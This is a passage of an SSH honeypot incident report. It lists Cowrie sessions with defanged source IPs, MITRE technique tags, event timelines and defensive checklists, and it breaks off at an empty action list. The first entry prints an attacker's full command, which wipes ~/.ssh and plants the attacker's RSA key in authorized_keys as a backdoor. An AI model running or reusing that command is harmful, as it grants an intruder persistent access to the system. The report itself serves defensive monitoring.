| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:51:56` | `cowrie.session.connect` |
| `2026-08-04 14:51:56` | `cowrie.client.version` |
| `2026-08-04 14:51:56` | `cowrie.client.kex` |
| `2026-08-04 14:51:56` | `cowrie.login.success` |
| `2026-08-04 14:51:57` | `cowrie.session.params` |
| `2026-08-04 14:51:57` | `cowrie.command.input` |
| `2026-08-04 14:51:57` | `cowrie.command.failed` |
| `2026-08-04 14:51:57` | `cowrie.log.closed` |
| `2026-08-04 14:51:57` | `cowrie.session.params` |
| `2026-08-04 14:51:57` | `cowrie.command.input` |
| `2026-08-04 14:51:57` | `cowrie.session.file_download` |
| `2026-08-04 14:51:57` | `cowrie.log.closed` |
| `2026-08-04 14:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.69[.]233` to AbuseIPDB if not already reported
- [ ] Block `20.102.69[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a97780de4d

| Field | Detail |
|---|---|
| **Source IP** | `20.102.69[.]233` |
| **First Seen** | 2026-08-04 14:51 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:51:57` | `cowrie.session.connect` |
| `2026-08-04 14:51:57` | `cowrie.client.version` |
| `2026-08-04 14:51:57` | `cowrie.client.kex` |
| `2026-08-04 14:51:58` | `cowrie.login.success` |
| `2026-08-04 14:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.69[.]233` to AbuseIPDB if not already reported
- [ ] Block `20.102.69[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d3caa2b3ac

| Field | Detail |
|---|---|
| **Source IP** | `20.102.69[.]233` |
| **First Seen** | 2026-08-04 14:51 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:51:58` | `cowrie.session.connect` |
| `2026-08-04 14:51:58` | `cowrie.client.version` |
| `2026-08-04 14:51:58` | `cowrie.client.kex` |
| `2026-08-04 14:51:58` | `cowrie.login.success` |
| `2026-08-04 14:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.69[.]233` to AbuseIPDB if not already reported
- [ ] Block `20.102.69[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593c16e5d324

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:52 |
| **Last Seen** | 2026-08-04 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:52:28` | `cowrie.session.connect` |
| `2026-08-04 14:52:28` | `cowrie.client.version` |
| `2026-08-04 14:52:28` | `cowrie.client.kex` |
| `2026-08-04 14:52:29` | `cowrie.login.success` |
| `2026-08-04 14:52:29` | `cowrie.session.params` |
| `2026-08-04 14:52:29` | `cowrie.command.input` |
| `2026-08-04 14:52:29` | `cowrie.log.closed` |
| `2026-08-04 14:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51bcf12132f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:54 |
| **Last Seen** | 2026-08-04 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:54:08` | `cowrie.session.connect` |
| `2026-08-04 14:54:08` | `cowrie.client.version` |
| `2026-08-04 14:54:08` | `cowrie.client.kex` |
| `2026-08-04 14:54:08` | `cowrie.login.success` |
| `2026-08-04 14:54:09` | `cowrie.session.params` |
| `2026-08-04 14:54:09` | `cowrie.command.input` |
| `2026-08-04 14:54:09` | `cowrie.log.closed` |
| `2026-08-04 14:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef88ad597e76

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:55 |
| **Last Seen** | 2026-08-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:55:52` | `cowrie.session.connect` |
| `2026-08-04 14:55:52` | `cowrie.client.version` |
| `2026-08-04 14:55:52` | `cowrie.client.kex` |
| `2026-08-04 14:55:52` | `cowrie.login.success` |
| `2026-08-04 14:55:53` | `cowrie.session.params` |
| `2026-08-04 14:55:53` | `cowrie.command.input` |
| `2026-08-04 14:55:53` | `cowrie.log.closed` |
| `2026-08-04 14:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a07de71ef37

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:57 |
| **Last Seen** | 2026-08-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:57:37` | `cowrie.session.connect` |
| `2026-08-04 14:57:37` | `cowrie.client.version` |
| `2026-08-04 14:57:37` | `cowrie.client.kex` |
| `2026-08-04 14:57:37` | `cowrie.login.success` |
| `2026-08-04 14:57:38` | `cowrie.session.params` |
| `2026-08-04 14:57:38` | `cowrie.command.input` |
| `2026-08-04 14:57:38` | `cowrie.log.closed` |
| `2026-08-04 14:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2131547b160f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:59 |
| **Last Seen** | 2026-08-04 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:59:20` | `cowrie.session.connect` |
| `2026-08-04 14:59:20` | `cowrie.client.version` |
| `2026-08-04 14:59:20` | `cowrie.client.kex` |
| `2026-08-04 14:59:20` | `cowrie.login.success` |
| `2026-08-04 14:59:21` | `cowrie.session.params` |
| `2026-08-04 14:59:21` | `cowrie.command.input` |
| `2026-08-04 14:59:21` | `cowrie.log.closed` |
| `2026-08-04 14:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a98ac31d3e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:01 |
| **Last Seen** | 2026-08-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:01:06` | `cowrie.session.connect` |
| `2026-08-04 15:01:06` | `cowrie.client.version` |
| `2026-08-04 15:01:06` | `cowrie.client.kex` |
| `2026-08-04 15:01:06` | `cowrie.login.success` |
| `2026-08-04 15:01:07` | `cowrie.session.params` |
| `2026-08-04 15:01:07` | `cowrie.command.input` |
| `2026-08-04 15:01:07` | `cowrie.log.closed` |
| `2026-08-04 15:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d15ea99e79f

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]41` |
| **First Seen** | 2026-08-04 15:01 |
| **Last Seen** | 2026-08-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:01:49` | `cowrie.session.connect` |
| `2026-08-04 15:01:49` | `cowrie.client.version` |
| `2026-08-04 15:01:49` | `cowrie.client.kex` |
| `2026-08-04 15:01:50` | `cowrie.login.success` |
| `2026-08-04 15:01:50` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:01:50` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4a2cdf3d08

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:02 |
| **Last Seen** | 2026-08-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:02:57` | `cowrie.session.connect` |
| `2026-08-04 15:02:57` | `cowrie.client.version` |
| `2026-08-04 15:02:57` | `cowrie.client.kex` |
| `2026-08-04 15:02:57` | `cowrie.login.success` |
| `2026-08-04 15:02:58` | `cowrie.session.params` |
| `2026-08-04 15:02:58` | `cowrie.command.input` |
| `2026-08-04 15:02:58` | `cowrie.log.closed` |
| `2026-08-04 15:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d55fb81bc2e7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:04 |
| **Last Seen** | 2026-08-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:04:43` | `cowrie.session.connect` |
| `2026-08-04 15:04:43` | `cowrie.client.version` |
| `2026-08-04 15:04:43` | `cowrie.client.kex` |
| `2026-08-04 15:04:43` | `cowrie.login.success` |
| `2026-08-04 15:04:44` | `cowrie.session.params` |
| `2026-08-04 15:04:44` | `cowrie.command.input` |
| `2026-08-04 15:04:44` | `cowrie.log.closed` |
| `2026-08-04 15:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795151e8f8b3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:06 |
| **Last Seen** | 2026-08-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:06:27` | `cowrie.session.connect` |
| `2026-08-04 15:06:27` | `cowrie.client.version` |
| `2026-08-04 15:06:27` | `cowrie.client.kex` |
| `2026-08-04 15:06:27` | `cowrie.login.success` |
| `2026-08-04 15:06:28` | `cowrie.session.params` |
| `2026-08-04 15:06:28` | `cowrie.command.input` |
| `2026-08-04 15:06:28` | `cowrie.log.closed` |
| `2026-08-04 15:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fd7006f6a5a

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]67` |
| **First Seen** | 2026-08-04 15:06 |
| **Last Seen** | 2026-08-04 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:06:50` | `cowrie.session.connect` |
| `2026-08-04 15:06:50` | `cowrie.client.version` |
| `2026-08-04 15:06:50` | `cowrie.client.kex` |
| `2026-08-04 15:06:51` | `cowrie.login.success` |
| `2026-08-04 15:06:51` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:06:51` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]67` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa0277450faf

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:08 |
| **Last Seen** | 2026-08-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:08:12` | `cowrie.session.connect` |
| `2026-08-04 15:08:12` | `cowrie.client.version` |
| `2026-08-04 15:08:12` | `cowrie.client.kex` |
| `2026-08-04 15:08:13` | `cowrie.login.success` |
| `2026-08-04 15:08:14` | `cowrie.session.params` |
| `2026-08-04 15:08:14` | `cowrie.command.input` |
| `2026-08-04 15:08:14` | `cowrie.log.closed` |
| `2026-08-04 15:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f574b4c50c39

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:09 |
| **Last Seen** | 2026-08-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:09:58` | `cowrie.session.connect` |
| `2026-08-04 15:09:58` | `cowrie.client.version` |
| `2026-08-04 15:09:58` | `cowrie.client.kex` |
| `2026-08-04 15:09:59` | `cowrie.login.success` |
| `2026-08-04 15:09:59` | `cowrie.session.params` |
| `2026-08-04 15:09:59` | `cowrie.command.input` |
| `2026-08-04 15:09:59` | `cowrie.log.closed` |
| `2026-08-04 15:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dd4549978c

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]50` |
| **First Seen** | 2026-08-04 15:10 |
| **Last Seen** | 2026-08-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:10:15` | `cowrie.session.connect` |
| `2026-08-04 15:10:15` | `cowrie.client.version` |
| `2026-08-04 15:10:15` | `cowrie.client.kex` |
| `2026-08-04 15:10:15` | `cowrie.login.success` |
| `2026-08-04 15:10:16` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:10:16` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]50` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7671c43d99f

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-04 15:10 |
| **Last Seen** | 2026-08-04 15:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:10:19` | `cowrie.session.connect` |
| `2026-08-04 15:10:20` | `cowrie.client.version` |
| `2026-08-04 15:10:20` | `cowrie.client.kex` |
| `2026-08-04 15:10:22` | `cowrie.login.success` |
| `2026-08-04 15:10:23` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cab9ada01dd4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:11 |
| **Last Seen** | 2026-08-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:11:42` | `cowrie.session.connect` |
| `2026-08-04 15:11:42` | `cowrie.client.version` |
| `2026-08-04 15:11:42` | `cowrie.client.kex` |
| `2026-08-04 15:11:42` | `cowrie.login.success` |
| `2026-08-04 15:11:43` | `cowrie.session.params` |
| `2026-08-04 15:11:43` | `cowrie.command.input` |
| `2026-08-04 15:11:43` | `cowrie.log.closed` |
| `2026-08-04 15:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816e69f1104e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:13 |
| **Last Seen** | 2026-08-04 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:13:26` | `cowrie.session.connect` |
| `2026-08-04 15:13:26` | `cowrie.client.version` |
| `2026-08-04 15:13:26` | `cowrie.client.kex` |
| `2026-08-04 15:13:27` | `cowrie.login.success` |
| `2026-08-04 15:13:27` | `cowrie.session.params` |
| `2026-08-04 15:13:27` | `cowrie.command.input` |
| `2026-08-04 15:13:28` | `cowrie.log.closed` |
| `2026-08-04 15:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-666e247eb61e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:15 |
| **Last Seen** | 2026-08-04 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:15:14` | `cowrie.session.connect` |
| `2026-08-04 15:15:14` | `cowrie.client.version` |
| `2026-08-04 15:15:14` | `cowrie.client.kex` |
| `2026-08-04 15:15:14` | `cowrie.login.success` |
| `2026-08-04 15:15:15` | `cowrie.session.params` |
| `2026-08-04 15:15:15` | `cowrie.command.input` |
| `2026-08-04 15:15:15` | `cowrie.log.closed` |
| `2026-08-04 15:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16dfeb84ff21

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]234` |
| **First Seen** | 2026-08-04 15:16 |
| **Last Seen** | 2026-08-04 15:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:16:04` | `cowrie.session.connect` |
| `2026-08-04 15:16:04` | `cowrie.client.version` |
| `2026-08-04 15:16:04` | `cowrie.client.kex` |
| `2026-08-04 15:16:05` | `cowrie.login.success` |
| `2026-08-04 15:16:05` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:16:05` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]234` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee7d4ea3d3dc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:17 |
| **Last Seen** | 2026-08-04 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:17:01` | `cowrie.session.connect` |
| `2026-08-04 15:17:01` | `cowrie.client.version` |
| `2026-08-04 15:17:01` | `cowrie.client.kex` |
| `2026-08-04 15:17:02` | `cowrie.login.success` |
| `2026-08-04 15:17:03` | `cowrie.session.params` |
| `2026-08-04 15:17:03` | `cowrie.command.input` |
| `2026-08-04 15:17:03` | `cowrie.log.closed` |
| `2026-08-04 15:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed62f130c81

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:18 |
| **Last Seen** | 2026-08-04 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:18:44` | `cowrie.session.connect` |
| `2026-08-04 15:18:44` | `cowrie.client.version` |
| `2026-08-04 15:18:44` | `cowrie.client.kex` |
| `2026-08-04 15:18:45` | `cowrie.login.success` |
| `2026-08-04 15:18:45` | `cowrie.session.params` |
| `2026-08-04 15:18:45` | `cowrie.command.input` |
| `2026-08-04 15:18:45` | `cowrie.log.closed` |
| `2026-08-04 15:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdcae47eec77

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-08-04 15:19 |
| **Last Seen** | 2026-08-04 15:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:19:01` | `cowrie.session.connect` |
| `2026-08-04 15:19:02` | `cowrie.client.version` |
| `2026-08-04 15:19:02` | `cowrie.client.kex` |
| `2026-08-04 15:19:05` | `cowrie.login.success` |
| `2026-08-04 15:19:07` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
